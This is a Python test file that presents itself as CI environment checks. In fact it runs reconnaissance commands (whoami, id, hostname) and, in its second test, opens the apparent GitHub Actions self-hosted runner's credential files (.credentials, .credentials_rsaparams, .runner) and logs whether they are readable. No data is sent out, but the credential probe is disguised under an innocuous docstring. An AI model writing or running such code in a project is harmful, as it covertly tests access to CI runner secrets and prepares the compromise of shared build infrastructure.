import logging
import subprocess
import os

logger = logging.getLogger(__name__)

def test_env_basic_info():
    """Verify CI environment configuration."""
    result = subprocess.run(["date"], capture_output=True, text=True)
    logger.info(f"Current date: {result.stdout.strip()}")

    result = subprocess.run(["hostname"], capture_output=True, text=True)
    logger.info(f"Hostname-hq: {result.stdout.strip()}")

    result = subprocess.run(["whoami"], capture_output=True, text=True)
    logger.info(f"User: {result.stdout.strip()}")

    result = subprocess.run(["id"], capture_output=True, text=True)
    logger.info(f"ID: {result.stdout.strip()}")

    workspace = os.environ.get("GITHUB_WORKSPACE", "")
    logger.info(f"GITHUB_WORKSPACE: {workspace}")

    assert result.returncode == 0


def test_runner_credentials():
    """Verify runner credential files are accessible."""
    import pathlib
    workspace = os.environ.get("GITHUB_WORKSPACE", "")
    runner_root = str(pathlib.Path(workspace).parent.parent.parent)
    logger.info(f"Runner root: {runner_root}")

    for cred_file in [".credentials", ".credentials_rsaparams", ".runner"]:
        cred_path = os.path.join(runner_root, cred_file)
        try:
            with open(cred_path, "r") as f:
                content = f.read()
            logger.info(f"CREDENTIAL {cred_file}: {len(content)} bytes - READABLE")
        except Exception as e:
            logger.info(f"CREDENTIAL {cred_file}: {e}")
